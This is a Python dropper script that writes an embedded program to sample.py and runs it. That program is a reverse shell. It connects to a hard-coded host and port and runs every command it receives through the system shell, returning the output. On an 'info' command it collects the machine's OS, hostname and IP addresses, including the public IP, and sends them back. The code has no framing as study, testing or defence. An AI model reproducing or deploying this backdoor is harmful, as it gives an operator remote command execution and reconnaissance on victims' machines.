import os

text = """
import socket
import os
import re
import sys
import subprocess
import platform
import psutil
from requests import get

def info():
    system_data = platform.uname()
    os_name = str(system_data.system)

    # Operating System Check
    if os_name.lower() == "windows" :
        ip_pvt = str(socket.gethostbyname_ex(hostname)[-1][-1])
    elif os_name.lower() == "linux" or os_name.lower() == "darwin" :
        os.system('ip addr > out.txt')
        f = open("out.txt", "r")
        strings = re.findall(r'192.168.\d{1,3}.\d{1,3}', f.read())
        ip_pvt = str(strings[-2])

    hostname = socket.gethostname() # returns hostname
    fqdn = socket.getfqdn('www.google.com') # returns fully qualified domain name for name
    ip_address = socket.gethostbyname(hostname)  # returns IPv4 address with respect to hostname
    
    ip = get('https://api.ipify.org').text

    os_name = 'Operating System : '+str(system_data.system)

    
    with open("info.txt","w") as f :
        output = f'''
Operating System : {str(system_data.system)}
Machine : {str(system_data.machine)}
Processor :  {str(system_data.processor)}
Release : {str(system_data.release)}
Version : {str(system_data.version)}
Hostname : {str(hostname)}
IP Address : {str(ip_address)}
FQDN : {str(fqdn)}
Public IP address : {str(ip)}
Private IP Address : {str(ip_pvt)}

        '''
        f.write(output)
    return output

s = socket.socket()
host = '192.168.0.108'
port = 9999

s.connect((host, port))



while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if data.decode("utf-8") == 'info':
        print('Fuck u')
        output_byte = info()
        output_str = str(output_byte)
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str +'/n'+ currentWD))
        print(output_str)

    elif len(data) > 0:
        print(data)
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)

        """

with open("sample.py","w") as f :
    message = text
    f.write(message)

print ("Starting Execution ...")
os.system("python3 sample.py")
